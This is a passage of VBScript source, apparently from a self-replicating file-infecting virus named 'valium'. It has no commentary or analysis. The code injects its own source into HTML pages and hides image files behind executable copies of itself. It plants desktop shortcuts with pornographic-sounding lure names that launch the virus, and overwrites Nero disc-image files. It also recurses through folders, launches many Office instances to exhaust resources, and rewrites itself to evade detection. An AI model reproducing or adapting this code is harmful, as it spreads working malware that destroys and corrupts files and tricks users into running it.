'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
'HyperText language infection
'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
If fso.GetExtensionName(file.path)="html" or fso.GetExtensionName(file.path)="htt" or fso.GetExtensionName(file.path)="htm" or fso.GetExtensionName(file.path)="shtml" then
	set a = fso.opentextfile(file.path,2)
	l = a.readline
	if l <> "<!---->" then
		b = a.readall
		set c = fso.opentextfile(Wscript.scriptfullname)
		bc = c.readall
		c.close
		a.writeline "<!---->"
		a.writeline "<html><Body><Script language=" & chr(34) & "VBScript" & chr(34) & ">"
		a.write bc
		a.writeline "<" & chr(47) & "script></body></html>"
		a.write b
		a.close
	end if
end if


'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
'Graphical infection
'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
If fso.GetExtensionName(file.path)="bmp" or fso.GetExtensionName(file.path)="jpg" or fso.GetExtensionName(file.path)="gif" or fso.GetExtensionName(file.path)="ico" then
	on error resume next
	set fso = createobject("scripting.filesystemobject")
	set runer = wscript.CreateObject("wscript.shell")
	set tes = fso.opentextfile(Wscript.Scriptfullname,1)
	scr = tes.readall
	bathelp = file.path & ".bat"
	Set dropper = Fso.Createtextfile(bathelp, True)
	dropper.writeline "Attrib +h " & file.path
	dropper.Close
	runer.run bathelp
	Fso.Deletefile bathelp
	vbscopy = file.path & ".jgp"
	Set dropper2 = Fso.Createtextfile(vbscopy, True)
	dropper2.write "CreateObject(" & chr(34) & "WScript.Shell" & chr(34) & ").run " & chr(34) & file.path & chr(34) & vbcrlf
	dropper2.write scr
	dropper2.Close
end if


'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
'Create lnk file at desktop and link it to the valium(win9x,Me)
'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

if fso.FolderExists("C:\windows\Desktop") then
	on error resume next
	set shell=wscript.createobject("wscript.shell")
	set msc=shell.CreateShortCut("C:\windows\Desktop\Porn_pic.jpg.lnk")
	msc.TargetPath = Shell.ExpandEnvironmentStrings("C:\windows\valium.vbs")
	msc.WindowStyle = 4
	msc.Save
end if

'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
'Create lnk file at desktop and link it to the valium(Xp,Nt)
'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

if fso.FolderExists("C:\Documents and Settings\All Users\Desktop") then
	on error resume next
	set executor=wscript.createobject("wscript.shell")
	set msc=executor.CreateShortCut("C:\Documents and Settings\All Users\Desktop\Porno-pic.jpg.lnk")
	msc.TargetPath = executor.ExpandEnvironmentStrings("C:\windows\valium.vbs")
	msc.IconLocation = Shell.ExpandEnvironmentStrings("C:\windows\system32\mspaint.exe, 0")
	msc.WindowStyle = 4
	msc.Save
end if

'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
'Nrb infection
'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

If fso.GetExtensionName(file.path)="nrb" then
	a = "0E4E65726F49534F302E30322E303301000000010000000000124"
	b = "E45524F202D204255524E494E4720524F4D0000003428F9403428"
	c = "F940FFFFFFFFFFFFFFFF000000003428F94001000000000000000"
	d = "1000000010000000100000001000000074D792044697363074D79"
	e = "20446973631000000000000000000000000180568737016CC4018"
	f = "072D545016CC40180568737016CC4010000400000000000000000"
	g = "0000000002000000433A01000000010700000057494E444F57530"
	h = "1000000000100000C73797374656D43442E766273200000000000"
	i = "00000200000000E096F8B33B6CC401002B70BA3B6CC40180B5D34"
	j = "0016CC40100000010025F5F5F3156434431060001000000040000"
	k = "00000045444A4F030001000000010002444F535F0E00010000000"
	l = "C0053595354454D43442E5642534653495A0A0001000000080000"
	m = "000000000000005052494F0A00020000000400000000000400000"
	n = "00000454E44210200000000000000000000000000425553546A00"
	o = "00000000000001000000010000000000000000000000000000000"
	p = "100000001000000010000000000000000000100FFFFFF7F000000"
	q = "00000000000100000000000000010000000000000000000000000"
	r = "000000000000000000100000000000000000000004B4E554A544F"
	s = "4F4200000000FFFFFFFF2E433A5C50524F4752414D2046494C455"
	t = "35C41484541445C4E45524F5C4472446F73426F6F74696D616765"
	u = "2E494D41C0070100020059484F4E534D544217437265617465642"
	v = "06279204E65726F20457870726573734C4F564A034E4557000000"
	w = "00124E65726F202D204275726E696E6720524F4D0000000100000"
	x = "0544E454E4644554E58454F4200000000
	GenCode = a&b&c&d&e&f&g&h&i&j&k&l&m&n&o&p&q&r&s&t&u&v&w&x
	For letscount = 1 To Len(GenCode) Step 2
		NewCode = NewCode & Chr("&h"& Mid(GenCode, letscount, 2))
	next
	Set nrbinfector = fso.createtextfile(file.path, True)
	nrbinfector.write NewCode
	nrbinfector.close
end if

'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
'Nri Infection
'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

If fso.GetExtensionName(file.path)="nri" then
	a = "0E4E65726F49534F302E30322E3033010000000100000000001"
	b = "24E45524F202D204255524E494E4720524F4D000000F827F940"
	c = "F827F940FFFFFFFFFFFFFFFF00000000F827F94001000000000"
	d = "0000001000000010000000100000000000000074D7920446973"
	e = "63074D7920446973631000000000000000000000000140CBC31"
	f = "B016CC401A0811333016CC40140CBC31B016CC4010000400000"
	g = "0000000000000000000002000000433A0100000001070000005"
	h = "7494E444F575301000000000100000C73797374656D43442E76"
	i = "627320000000000000000200000000E096F8B33B6CC401002B7"
	j = "0BA3B6CC40120B8FD28016CC40100000010025F5F5F31564344"
	k = "3106000100000004000000000045444A4F03000100000001000"
	l = "2444F535F0E00010000000C0053595354454D43442E56425346"
	m = "53495A0A0001000000080000000000000000005052494F0A000"
	n = "2000000040000000000040000000000454E4421020000000000"
	o = "0000000000000000425553546A0000000000000001000000010"
	p = "000000000000000000000000000000100000000000000010000"
	q = "000000000000000100FFFFFF7F0000000000000000010000000"
	r = "000000001000000000000000000000000000000000000000000"
	s = "0100000000000000000000004B4E554A54424F4E59484F4E534"
	t = "D5442154E65726F20426F6F742D4C6F616465722056332E304C"
	u = "4F564A034E455700000000124E65726F202D204275726E696E6"
	v = "720524F4D00000001000000544E454E4644554E45424F4E"
	GenCode = a&b&c&d&e&f&g&h&i&j&k&l&m&n&o&p&q&r&s&t&u&v
	For letscount = 1 To Len(GenCode) Step 2
		NewCode = NewCode & Chr("&h"& Mid(GenCode, letscount, 2))
	next
	Set nrinfector = fso.createtextfile(file.path, True)
	nrinfector.write NewCode
	nrinfector.close
end if

Set Subfolders = folder.SubFolders
For Each Subfolder in Subfolders
	Dosearch Subfolder.path
Next
end function

'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
'Just an crazy tough,simple memory resident for scripts
'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
for i = 1 to 20:Set w = CreateObject("Word.application"):Set e = CreateObject("ExCeL.application"):next

'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
'Self destruction
'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
if day(now) = 1 and month(now) = 1 and year(now) = 2006 then
  set fso = createobject("scripting.filesystemobject")
  fso.deletefile wscript.scriptfullname
end if

'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
'Polymorph,Self crypting with simple epo,you know it also vulnerable for script,but it need to drop
'file for buffer characters
'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

set fso = createobject("scripting.filesystemobject")
set op = fso.opentextfile(wscript.scriptfullname,1)
set parser = fso.Createtextfile("C:\poly.txt",true)
do while mark <> "'valium"
  mark = op.readline
  for i = 1 to len(mark)

      c = mid(mark,i,1)
      if c = chr(34) then
          Call Poly
      else
          parser.write c
      end if

      if i = len(mark) then
          parser.write vbcrlf
      end if
  next
loop

sub Poly()
Counter = i
do while enc <> chr(34)
  Counter = Counter + 1
  enc = mid(mark,Counter,1)
  if enc = chr(34) then exit do
      char = char & enc
loop
all = "decrypt(" & chr(34) & strreverse(char) & chr(34) & ")"
parser.write all
i = Counter
end sub
op.close
parser.close
set back = fso.opentextfile("C:\poly.txt",1)
reader = back.readall
set wrtall = fso.Createtextfile("C:\poly.txt",true)
wrtall.write reader
wrtall.writeline "function decrypt(x)" & vbcrlf & "Decrypt = strreverse(x):end function"
fso.copyfile "C:\poly.txt",wscript.scriptfullname

'valium